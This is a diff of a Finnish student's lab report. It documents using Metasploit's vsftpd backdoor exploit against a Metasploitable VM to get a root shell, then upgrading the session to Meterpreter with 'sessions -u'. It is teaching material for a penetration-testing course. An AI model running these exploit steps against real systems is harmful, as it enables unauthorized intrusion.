@@ -96,20 +96,37 @@ Suoritin tämän ensimmäisen kerran tunnilla, ja silloin käytin apuna tätä o
 mfsconsolessa: 
 
 - Etsin hyökkäyksen: ``search vsftpd``
-- Valitsin hyökkäyksen (valitsin yhden esimerkeistä): ``use 1``
+- Valitsin hyökkäyksen (valitsin yhden esimerkeistä): ``use 1`` eli cmd/unix/interact
 - Valitsin kohteen: ``set RHOSTS 192.168.56.102``
 - Suoritin hyökkäyksen: ``run``
-- ``whoami`` -> olen root, Metasploitablen komentorivillä
+- ``whoami``, ``uname -a`-> olen root, Metasploitablen komentorivillä
   
-![image](https://github.com/user-attachments/assets/28e0a877-573f-4c5d-8774-49286138d8a2)
 
-
+![image](https://github.com/user-attachments/assets/1bc74376-e719-4442-bbdb-43582d7212b7)
 
 
 ## h) Päivitä äskeisen vsftpd-murron yhteydessä syntynyt sessio meterpretriin
 
+Sitten etsin apua Meterpreterin käyttöön, sillä se on minulle täysin uusi. Löysin Youtube-tutoriaalin [Managing Sessions and using Meterpreter](https://www.youtube.com/watch?v=ApfRA0xLOo0) jota lähdin seuraamaan. 
+
+Painamalla CTRL + Z jätin session päälle taustalle. ``sessions -h``löytyy lisää komentoja sessioiden hallintaan. Kokeilin komentoa ``sessions -l`` jolla saa listan päällä olevista sessioista.
+
+![image](https://github.com/user-attachments/assets/6e327844-a563-4fac-99e8-e5f6b65a7c1e)
+
+
+Komennolla ``sessions -u 1`` päivitin session Meterpreter-sessioksi. Nyt listaamalla sessiot näkyi listassa aiemman session lisäksi Meterpreter-sessio.
+
+![image](https://github.com/user-attachments/assets/0ea91170-3d59-451e-922c-9ae2ddee1b90)
+
+
+``sessions -i 2`` komennolla avasin Meterpreter-session. ``?`` komennolla näkyi lista Meterpreterillä käytettävistä komennoista.
+
+
+
 
 ## i) Kerää levittäytymisessä (lateral movement) tarvittavaa tietoa metasploitablesta. Analysoi tiedot. Selitä, miten niitä voisi hyödyntää
+
+
 
 
 ## j) Murtaudu Metasploitableen jollain toisella tavalla
@@ -132,3 +149,5 @@ https://www.tutorialspoint.com/nmap-cheat-sheet
 https://tiedosto.info/extension/xml.html
 
 https://nmap.org/book/output-formats-grepable-output.html
+
+https://medium.com/@jasonjayjacobs/exploiting-vsftpd-in-metasploitable-2-cf975ead1173
